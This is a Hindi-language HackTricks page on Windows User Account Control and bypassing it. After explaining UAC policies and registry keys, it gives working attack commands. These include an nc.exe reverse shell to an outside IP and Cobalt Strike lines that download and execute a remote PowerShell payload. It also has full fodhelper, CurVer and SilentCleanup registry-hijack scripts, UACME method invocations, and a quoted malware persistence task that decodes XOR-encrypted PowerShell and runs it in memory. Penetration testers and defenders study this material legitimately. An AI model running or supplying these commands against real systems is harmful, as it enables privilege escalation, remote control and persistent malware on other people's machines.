# UAC - यूज़र अकाउंट कंट्रोल

{{#include ../../banners/hacktricks-training.md}}

## UAC

[यूज़र अकाउंट कंट्रोल (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक ऐसी सुविधा है जो **उच्च विशेषाधिकार वाले कार्यों के लिए सहमति माँगने वाला प्रॉम्प्ट** दिखाती है। एप्लिकेशन के `integrity` स्तर अलग-अलग होते हैं, और **उच्च स्तर** वाला प्रोग्राम ऐसे कार्य कर सकता है जो **संभावित रूप से सिस्टम को नुकसान पहुँचा सकते हैं**। UAC सक्षम होने पर, एप्लिकेशन और टास्क हमेशा **गैर-एडमिनिस्ट्रेटर अकाउंट के सुरक्षा संदर्भ में चलते हैं**, जब तक कि कोई एडमिनिस्ट्रेटर इन एप्लिकेशन/टास्क को सिस्टम पर चलने के लिए एडमिनिस्ट्रेटर-स्तर की पहुँच की स्पष्ट अनुमति न दे। यह एक सुविधा है, जो एडमिनिस्ट्रेटर को अनजाने में किए गए बदलावों से बचाती है, लेकिन इसे सुरक्षा सीमा नहीं माना जाता।<sup>[[2]](#references)</sup>

Integrity स्तरों के बारे में अधिक जानकारी:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC लागू होने पर, एडमिनिस्ट्रेटर यूज़र को 2 टोकन दिए जाते हैं: सामान्य कार्यों को medium integrity पर करने के लिए एक standard user token, और एडमिन विशेषाधिकारों वाला एक टोकन।

यह [पेज](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC के काम करने के तरीके पर विस्तार से चर्चा करता है और इसमें लॉगऑन प्रक्रिया, यूज़र अनुभव और UAC आर्किटेक्चर शामिल हैं।<sup>[[2]](#references)</sup> एडमिनिस्ट्रेटर स्थानीय स्तर पर (secpol.msc का उपयोग करके) अपनी संस्था के अनुसार UAC के काम करने के तरीके को कॉन्फ़िगर करने के लिए सुरक्षा नीतियों का उपयोग कर सकते हैं, या Active Directory डोमेन वातावरण में Group Policy Objects (GPO) के ज़रिए इसे कॉन्फ़िगर और लागू कर सकते हैं। विभिन्न सेटिंग्स पर [यहाँ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) विस्तार से चर्चा की गई है। UAC के लिए 10 Group Policy सेटिंग्स निर्धारित की जा सकती हैं। नीचे दी गई तालिका में अतिरिक्त जानकारी दी गई है:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [यूज़र अकाउंट कंट्रोल: बिल्ट-इन एडमिनिस्ट्रेटर अकाउंट के लिए Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (अक्षम)                                             |
| [यूज़र अकाउंट कंट्रोल: Admin Approval Mode में एडमिनिस्ट्रेटर के लिए elevation prompt का व्यवहार](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (secure desktop पर गैर-Windows binaries के लिए सहमति माँगने वाला prompt) |
| [यूज़र अकाउंट कंट्रोल: standard users के लिए elevation prompt का व्यवहार](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (secure desktop पर credentials माँगने वाला prompt)         |
| [यूज़र अकाउंट कंट्रोल: एप्लिकेशन इंस्टॉलेशन का पता लगाना और elevation के लिए prompt दिखाना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (सक्षम; Enterprise में डिफ़ॉल्ट रूप से अक्षम)           |
| [यूज़र अकाउंट कंट्रोल: केवल signed और validated executables को elevate करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (अक्षम)                                             |
| [यूज़र अकाउंट कंट्रोल: केवल secure locations में इंस्टॉल किए गए UIAccess applications को elevate करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (सक्षम)                                              |
| [यूज़र अकाउंट कंट्रोल: सभी एडमिनिस्ट्रेटर को Admin Approval Mode में चलाना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (सक्षम)                                              |
| [यूज़र अकाउंट कंट्रोल: UIAccess applications को secure desktop का उपयोग किए बिना elevation के लिए prompt दिखाने की अनुमति देना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (अक्षम)                                             |
| [यूज़र अकाउंट कंट्रोल: elevation के लिए prompt दिखाते समय secure desktop पर स्विच करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (सक्षम)                                              |
| [यूज़र अकाउंट कंट्रोल: फ़ाइल और registry में लिखने की विफलताओं को प्रति-यूज़र स्थानों पर वर्चुअलाइज़ करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (सक्षम)                                              |

### Windows पर सॉफ़्टवेयर इंस्टॉल करने की नीतियाँ

**स्थानीय सुरक्षा नीतियाँ** (अधिकांश सिस्टम पर "secpol.msc") डिफ़ॉल्ट रूप से **गैर-एडमिन यूज़र्स को सॉफ़्टवेयर इंस्टॉल करने से रोकने** के लिए कॉन्फ़िगर की गई होती हैं। इसका मतलब है कि भले ही कोई गैर-एडमिन यूज़र आपके सॉफ़्टवेयर का इंस्टॉलर डाउनलोड कर सके, वह एडमिन अकाउंट के बिना उसे चला नहीं पाएगा।

### UAC से elevation माँगने के लिए Registry Keys

बिना एडमिन अधिकारों वाले standard user के रूप में, आप यह सुनिश्चित कर सकते हैं कि "standard" अकाउंट द्वारा कुछ कार्य करने की कोशिश करने पर **UAC credentials माँगने वाला prompt दिखाए**। इसके लिए कुछ **registry keys** में बदलाव करना होगा, जिसके लिए एडमिन अनुमतियाँ चाहिए—जब तक कि कोई **UAC bypass** न हो या हमलावर पहले से एडमिन के रूप में लॉग इन न हो।

भले ही यूज़र **Administrators** समूह में हो, ये बदलाव प्रशासनिक कार्य करने के लिए यूज़र से **अपने अकाउंट credentials फिर से दर्ज करने को कहते हैं**।

**व्यवहार में, यह तभी उपयोगी है जब आपके पास पहले से elevated token, UAC bypass, या कोई misconfiguration हो जो आपको इन keys को बदलने दे; अन्यथा registry में लिखने की कोशिश ही रोक दी जाएगी।**

जिन registry keys और entries को बदलना होगा, वे नीचे उनके डिफ़ॉल्ट मानों के साथ दी गई हैं:

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

यह Local Security Policy टूल के ज़रिए भी मैन्युअल रूप से किया जा सकता है। बदलाव करने के बाद, प्रशासनिक कार्रवाइयों के लिए यूज़र से अपने credentials फिर से दर्ज करने को कहा जाएगा।

### ध्यान दें

**यूज़र अकाउंट कंट्रोल कोई सुरक्षा सीमा नहीं है।** इसलिए, standard users किसी local privilege escalation exploit के बिना अपने अकाउंट से बाहर निकलकर एडमिनिस्ट्रेटर अधिकार हासिल नहीं कर सकते।

### किसी यूज़र से 'कंप्यूटर तक पूरी पहुँच' माँगना

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### UAC Privileges

- Internet Explorer Protected Mode, उच्च integrity स्तर वाली प्रक्रियाओं (जैसे web browsers) को निम्न integrity स्तर वाले डेटा (जैसे temporary Internet files फ़ोल्डर) तक पहुँचने से रोकने के लिए integrity checks का उपयोग करता है। यह browser को low-integrity token के साथ चलाकर किया जाता है। जब browser low-integrity zone में संग्रहीत डेटा तक पहुँचने का प्रयास करता है, तो operating system process का integrity level जाँचता है और उसी के अनुसार पहुँच की अनुमति देता है। यह सुविधा remote code execution attacks को system पर संवेदनशील डेटा तक पहुँचने से रोकने में मदद करती है।
- जब कोई user Windows में log on करता है, तो system एक access token बनाता है जिसमें user के privileges की सूची होती है। Privileges को user के अधिकारों और क्षमताओं के संयोजन के रूप में परिभाषित किया जाता है। Token में user के credentials की सूची भी होती है, जिनका उपयोग computer और network पर मौजूद resources के लिए user को authenticate करने हेतु किया जाता है।

### Autoadminlogon

Windows को startup पर किसी विशिष्ट user को automatically log on करने के लिए configure करने हेतु **`AutoAdminLogon` registry key** सेट करें। यह kiosk environments या testing के लिए उपयोगी है। इसका उपयोग केवल secure systems पर करें, क्योंकि इससे password registry में उजागर हो जाता है।

Registry Editor या `reg add` का उपयोग करके निम्नलिखित keys सेट करें:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

सामान्य logon व्यवहार पर लौटने के लिए, `AutoAdminLogon` को 0 पर सेट करें।

## UAC bypass

> [!TIP]
> ध्यान दें कि यदि आपके पास victim तक graphical access है, तो UAC bypass सीधा है, क्योंकि UAC prompt दिखाई देने पर आप बस "Yes" पर click कर सकते हैं।

निम्नलिखित स्थिति में UAC bypass की आवश्यकता होती है: **UAC सक्रिय हो, आपकी process medium integrity context में चल रही हो, और आपका user administrators group का सदस्य हो।**

यह बताना ज़रूरी है कि **यदि UAC का security level सबसे ऊँचे स्तर (Always) पर है, तो उसे bypass करना अन्य किसी भी स्तर (Default) की तुलना में बहुत कठिन होता है।**

### Medium-integrity shell से तेज़ triage

Bypass आज़माने से पहले, पुष्टि करें कि आप सही स्थिति में हैं और host build को ज्ञात काम करने वाले तरीकों से मिलाएँ:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

व्यावहारिक नोट्स:
- अगर `EnableLUA=0` है, तो आपको bypass की ज़रूरत नहीं है: कोई भी admin token सीधे high integrity का अनुरोध कर सकता है।
- `ConsentPromptBehaviorAdmin=2` या `5`, auto-elevate / COM-based bypasses के लिए आम स्थिति है।
- `Always Notify` सुरक्षा का स्तर बढ़ाता है, लेकिन फिर भी विफलता मान लेने के बजाय सटीक build को test करना चाहिए: UACME अब भी कुछ `AlwaysNotify compatible` methods को आधुनिक Windows builds पर track करता है।<sup>[[3]](#references)</sup>

### UAC अक्षम

अगर UAC पहले से अक्षम है (`ConsentPromptBehaviorAdmin` **`0`** है), तो आप कुछ इस तरह admin privileges के साथ (high integrity level पर) **reverse shell execute** कर सकते हैं:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + reusable debug object

AppInfo local RPC interface `201ef99a-7fa0-444c-9399-19ba84f12a1a` debugging enabled वाला process बना सकता है। एक ही thread पर debug-created processes उस thread का debug object साझा करते हैं; creation debug event में full-access process handle होता है, भले ही RPC result खुद केवल limited access देता हो। इससे debug-object reuse, Administrators group के medium-integrity सदस्य के लिए UAC primitive बन जाता है।<sup>[[11]](#references)[[12]](#references)</sup>

एक व्यावहारिक chain यह है:<sup>[[11]](#references)[[12]](#references)</sup>

1. debugging enabled वाला non-elevated sacrificial process बनाने के लिए local RPC method को (सीधे या `NdrAsyncClientCall` के ज़रिए) call करें।
2. `NtQueryInformationProcess` से `ProcessDebugObjectHandle` query करें, `NtRemoveProcessDebug` से उसे detach करें, object को अपने पास रखें और sacrificial process को terminate करें।
3. trusted auto-elevated process बनाने के लिए उसी RPC interface का इस्तेमाल करें, फिर `DbgUiSetThreadDebugObject` के ज़रिए saved object को calling thread से associate करें।
4. `WaitForDebugEvent` call करें और `CREATE_PROCESS_DEBUG_EVENT` process handle लें; आगे बढ़ने से पहले `NtDuplicateObject` से उसे duplicate करें।
5. duplicated handle को `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` में दें और extended startup-info structure के साथ payload launch करें। इससे elevated process context दोबारा इस्तेमाल होता है और child को trusted दिखने वाला parent relationship भी मिलता है।

केवल auto-elevated binary पर ध्यान देने के बजाय इस छोटी sequence को खोजें: local AppInfo RPC process creation, `ProcessDebugObjectHandle` queries, debugger detach/reattach, तुरंत आने वाला creation-debug event, handle duplication और ऐसा child जिसका recorded parent, creation APIs चलाने वाले process से मेल नहीं खाता।<sup>[[12]](#references)</sup>

### **बहुत** Basic UAC "bypass" (full file system access)

अगर आपके पास Administrators group के किसी user का shell है, तो आप SMB के ज़रिए साझा किए गए **C$** को एक नई disk पर local रूप से mount कर सकते हैं और **file system के अंदर मौजूद हर चीज़ तक access** पा सकते हैं (यहाँ तक कि Administrator के home folder तक भी)।

> [!WARNING]
> **लगता है कि यह trick अब काम नहीं करती**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Cobalt Strike के साथ UAC bypass

Cobalt Strike techniques तभी काम करेंगी जब UAC अपने अधिकतम सुरक्षा स्तर पर सेट न हो.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** और **Metasploit** में **UAC** को **bypass** करने के लिए कई modules भी हैं।

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objects आधुनिक builds में UAC का एक व्यावहारिक attack surface बने हुए हैं। `ICMLuaUtil` को UACME अब भी मौजूदा Windows branches पर काम करने वाले के रूप में track करता है, और offensive tooling `CMSTPLUA` को interactive desktop process, 64-bit execution और कभी-कभी COM Elevation Moniker invoke करने से पहले PEB/process masquerading के संयोजन से adapt करती रहती है।<sup>[[3]](#references)</sup>

व्यावहारिक सुझाव:
- उपयोगकर्ता के **interactive session** में **64-bit** process को प्राथमिकता दें (आमतौर पर `explorer.exe` या उसका child)।
- यदि raw shell काम न करे, तो naive `CreateProcess` wrapper की बजाय BOF / UACME implementation से दोबारा प्रयास करें।
- अपेक्षा करें कि child execution एक **अलग elevated process** में होगा; कई BOFs मौजूदा beacon को उसी में elevate नहीं करते।

### KRBUACBypass

दस्तावेज़ और tool यहाँ उपलब्ध हैं: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) UAC bypass techniques का एक collection है। इसे Visual Studio या MSBuild से compile करें; build कई executables बनाता है (उदाहरण के लिए, `Source\Akagi\output\x64\Debug\Akagi.exe`), इसलिए target build के लिए उपयुक्त method चुनें।<sup>[[3]](#references)</sup>\
सावधान रहें: कुछ bypasses ऐसे visible programs या prompts launch करते हैं जो उपयोगकर्ता को सतर्क कर सकते हैं।<sup>[[3]](#references)</sup>

UACME में **वह build version दिया गया है जिससे हर technique ने काम करना शुरू किया**।<sup>[[3]](#references)</sup> आप अपने versions को प्रभावित करने वाली technique खोज सकते हैं:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

साथ ही, [इस](https://en.wikipedia.org/wiki/Windows_10_version_history) पेज का उपयोग करके आप build versions से Windows release `1607` प्राप्त कर सकते हैं।

एक व्यावहारिक workflow यह है कि पहले **host build को score करें**, और उसके बाद ही उससे मेल खाने वाला method चलाएँ:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` स्थानीय build की उसके ज्ञात UAC methods से तेज़ी से तुलना करता है, जो पुराने PoCs को जल्दी हटाने में उपयोगी है।<sup>[[4]](#references)</sup>
- `UACME` किसी bypass को सटीक build से जोड़ने के लिए अब भी सबसे अच्छा सार्वजनिक catalogue है। Version 3.7.1 में methods 83–85 जोड़े गए, जबकि उससे पिछले release में मौजूदा methods को **Windows 11 25H2** के विरुद्ध फिर से जाँचा गया था; यह मानने के बजाय कि कोई पुराना PoC अब भी बिना बदलाव के काम करेगा, method table और release notes दोबारा जाँचें।<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify-सक्षम WNF/UIAccess chains (UACME 3.7.1)

`Always Notify` हर UAC bypass को समाप्त नहीं करता। UACME 3.7.1 में तीन नए x64 methods हैं, जो उपयोगकर्ता-नियंत्रित environment/protocol state को elevated scheduled-task या UIAccess behavior के साथ जोड़ते हैं, और इन सभी को `AlwaysNotify compatible` के रूप में चिह्नित किया गया है:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** `SystemRoot` को redirect करें, ताकि WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` के कारण elevated `taskhostw.exe`, `unifiedconsent.dll` को side-load करे। UACME इसे Windows 10 build 19041 से ट्रैक करता है।
- **84 — TabTip:** UIAccess `TabTip.exe` पर इसी environment-variable primitive का उपयोग करें। यह build के अनुसार `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll`, या `rsaenh.dll` को load करता है; फिर परिणामी high-integrity UIAccess context से आगे बढ़ें। UACME इसे Windows 8.1 / Server 2016 से ट्रैक करता है।
- **85 — Narrator:** प्रति-उपयोगकर्ता `feedback-hub` protocol को hijack करें, `Alt+CapsLock+F` से Narrator चलाएँ, फिर `osk.exe` की ऐसी writable copy launch करें जो `OskSupport.dll` को side-load करे। इसके लिए interactive desktop आवश्यक है; UACME इसे Windows 10 1809 / Server 2019 से ट्रैक करता है।

UACME के दस्तावेज़ के अनुसार payload units और Akagi बनाने के बाद, संबंधित method number चलाएँ (वैकल्पिक command का default `cmd.exe` है):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Methods 84 और 85 UIAccess/desktop interaction पर निर्भर करते हैं, इसलिए उनसे Session 0 या non-interactive service shell से बिना बदलाव के काम करने की अपेक्षा न करें। ये तीनों environment/protocol state में बदलाव करते हैं और DLLs को stage करते हैं; implementation की जाँच करें और परीक्षण के बाद उन artifacts को हटा दें।<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

विश्वसनीय binary `fodhelper.exe` आधुनिक Windows में auto-elevated होता है। लॉन्च होने पर, यह नीचे दिए गए per-user registry path को `DelegateExecute` verb की जाँच किए बिना query करता है। वहाँ कोई command रखने से Medium Integrity process (जिसका user Administrators में है) को UAC prompt के बिना High Integrity process spawn करने की अनुमति मिलती है।

fodhelper द्वारा query किया गया Registry path:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>PowerShell के चरण (अपना payload सेट करें, फिर trigger करें)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
नोट्स:
- यह तब काम करता है जब मौजूदा user Administrators का सदस्य हो और UAC level default/lenient हो (अतिरिक्त प्रतिबंधों वाले Always Notify पर नहीं)।
- 64-bit Windows पर 32-bit process से 64-bit PowerShell शुरू करने के लिए `sysnative` path का उपयोग करें।
- Payload कोई भी command हो सकता है (PowerShell, cmd या EXE path)। Stealth के लिए prompting UIs से बचें।

#### उसी `ms-settings` handler के लिए `ComputerDefaults.exe` trigger

`ComputerDefaults.exe`, `fodhelper.exe` वाले ही per-user `ms-settings\Shell\Open\command` association को resolve करता है।<sup>[[13]](#references)[[14]](#references)</sup> ऊपर default command और खाली `DelegateExecute` value सेट करने के बाद, वैकल्पिक trigger के रूप में `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` का उपयोग करें; registry setup दोबारा न करें।<sup>[[13]](#references)[[14]](#references)</sup> ऊपर `fodhelper.exe` नोट्स में बताई गई medium-integrity administrator और UAC policy की prerequisites यहाँ भी लागू होती हैं।<sup>[[2]](#references)[[3]](#references)</sup> UACME इस trigger को Windows 10 RS4 (build 17134) से सूचीबद्ध करता है, इसलिए target build पर इसे verify करें।<sup>[[3]](#references)</sup>

#### CurVer/extension hijack का variant (केवल HKCU)

`fodhelper.exe` का दुरुपयोग करने वाले हालिया samples `DelegateExecute` से बचते हैं और इसके बजाय per-user `CurVer` value के ज़रिए **`ms-settings` ProgID को redirect** करते हैं। Auto-elevated binary अब भी `HKCU` के तहत handler को resolve करता है, इसलिए keys बनाने के लिए admin token की ज़रूरत नहीं होती:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Elevated privileges मिलने के बाद, malware आम तौर पर `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` को `0` पर सेट करके **आगे आने वाले prompts को निष्क्रिय** कर देता है। फिर यह अतिरिक्त defense evasion करता है (जैसे, `Add-MpPreference -ExclusionPath C:\ProgramData`) और high integrity के साथ चलने के लिए persistence फिर से बनाता है। एक सामान्य persistence task, **XOR-encrypted PowerShell script** को disk पर संग्रहीत करता है और हर घंटे उसे decode करके memory में execute करता है:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

यह variant अभी भी dropper को साफ़ कर देता है और केवल staged payloads छोड़ता है, जिससे detection `CurVer` hijack, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion creation या उन scheduled tasks की monitoring पर निर्भर करता है जो PowerShell को memory में decrypt करते हैं।<sup>[[5]](#references)</sup>

### UAC bypass via `SilentCleanup` task (`HKCU\Environment\windir`)

`SilentCleanup`, `cleanmgr.exe` को highest privileges के साथ launch करता है और user environment से `%windir%` को expand करता है। यदि आपका `HKCU\Environment\windir` पर नियंत्रण है, तो आप उस expansion को किसी arbitrary command पर redirect कर सकते हैं और consent dialog के बिना high integrity प्राप्त कर सकते हैं।<sup>[[8]](#references)</sup> हाल के builds पर भी इस method को test करना उपयोगी है, क्योंकि UACME इस technique को active रखता है और हाल की issue tracking से पता चलता है कि Windows 11 24H2 में शायद quoting में केवल छोटे बदलावों की आवश्यकता हो।<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

यदि उस build पर task path को quote करता है, तो अंत में quote वाले payload के साथ दोबारा कोशिश करें (उदाहरण के लिए `cmd.exe"`). परीक्षण के बाद हमेशा `HKCU\Environment\windir` को साफ़ करें।

#### UAC bypass के और तरीके

कई क्लासिक UAC bypass, जो UI flows, COM objects या desktop interaction का दुरुपयोग करते हैं, उनके लिए victim के साथ **full interactive session** की आवश्यकता होती है; आम `nc.exe` shell या **Session 0** में चल रही service अक्सर पर्याप्त नहीं होती।

अक्सर आप **meterpreter** session का उपयोग करके यह समस्या हल कर सकते हैं। ऐसे **process** पर migrate करें जिसका **Session** value **1** के बराबर हो:

![ms-settings को किसी custom extension (.thm) पर point करें और उस extension को हमारे payload से map करें - UAC bypass के और तरीके: आप meterpreter session का उपयोग करके यह कर सकते हैं। ऐसे process पर migrate करें जिसका Session...](<../../images/image (863).png>)

(_explorer.exe_ को काम करना चाहिए)

### GUI के साथ UAC Bypass

यदि आपके पास **GUI का access है, तो UAC prompt दिखने पर आप उसे स्वीकार कर सकते हैं**; वास्तव में आपको किसी technical bypass की आवश्यकता नहीं है। इसलिए, UAC द्वारा जोड़ी गई व्यावहारिक बाधा को पार करने के लिए अक्सर GUI session हासिल करना ही पर्याप्त होता है।

इसके अलावा, यदि आपको ऐसा GUI session मिलता है जिसका उपयोग कोई कर रहा था (संभवतः RDP के ज़रिए), तो उसमें **कुछ tools administrator के रूप में चल रहे होंगे**। उनसे आप, उदाहरण के लिए, **cmd** को सीधे **admin के रूप में चला** सकते हैं और UAC द्वारा दोबारा prompt नहीं किया जाएगा, जैसे [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)। यह कुछ अधिक **stealthy** हो सकता है।

### शोर करने वाला brute-force UAC bypass

यदि शोर स्वीकार्य है, तो [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) जैसा tool उपयोगकर्ता द्वारा स्वीकार किए जाने तक बार-बार elevation का अनुरोध कर सकता है।

### अपना bypass - UAC bypass की बुनियादी methodology

